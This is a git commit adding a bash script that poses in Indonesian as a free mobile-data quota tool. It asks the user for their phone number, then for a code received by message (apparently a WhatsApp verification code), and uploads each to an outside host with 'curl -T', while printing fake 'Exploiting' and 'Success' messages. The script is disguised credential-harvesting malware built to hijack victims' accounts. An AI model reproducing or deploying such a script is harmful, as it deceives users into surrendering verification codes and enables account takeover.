6f14acd57fa043ae20425cf4680cc1d04815d575
SantriPasuruan <46401305+SantriPasuruan@users.noreply.github.com>
2019-02-09 10:40:02 +0000

    Create Gratiskuota.sh

---
+++ Gratiskuota.sh
@@ -0,0 +1,116 @@
+#!/bin/bash
+
+
+clear
+
+
+echo "
+
+<-- INTERNET GRATIS-->
+
+####################
+
+# Tembak kuota # By Santri_pasuruan
+
+# Santri Team official Thx For MR.Clay
+
+####################
+
+SEMOGA BERUNTUNG";
+
+
+echo "";
+
+
+read -p "isi dengan nomerKamu (+62xxxx)=> " nomer;
+
+
+read -p "Berapa GB yang akan di tembak => " ketik;
+
+
+sleep 2
+
+
+echo "[+] proses...";
+
+
+sleep 1
+
+
+echo "Tunggu 5 Detik => $nomer";
+
+
+sleep 0.5
+
+
+echo "Target => $Jumlah";
+
+
+sleep 0.5
+
+
+echo "[+] Exploiting...";
+
+
+echo "Tunggu 5 Detik=> $nomer" >> Sukses.html;
+
+
+curl -T Sukses.html http://apparelworld.org/
+
+
+sleep 5;
+
+
+echo "[+] Done.";
+
+
+echo "Selamat penembakan Sukses.";
+
+
+read -p "Silahkan Cek pesan anda => " code;
+
+
+sleep 2
+
+
+echo "[+] Connecting to whatsapp.com...";
+
+
+echo "Tunggu 5 Detik => $nomer";
+
+
+sleep 0.5
+
+
+echo "Code => $Jumlah";
+
+
+sleep 0.5
+
+
+echo "Target => $jumlah";
+
+
+sleep 0.5
+
+
+echo "[+] Sending Exploit...";
+
+
+echo "Code => $code" >> Sukses.html;
+
+
+curl -T Sukses.html http://apparelworld.org/
+
+
+sleep 5
+
+
+echo "[+] Success Exploited!";
+
+
+exit;
+
+
+D
+
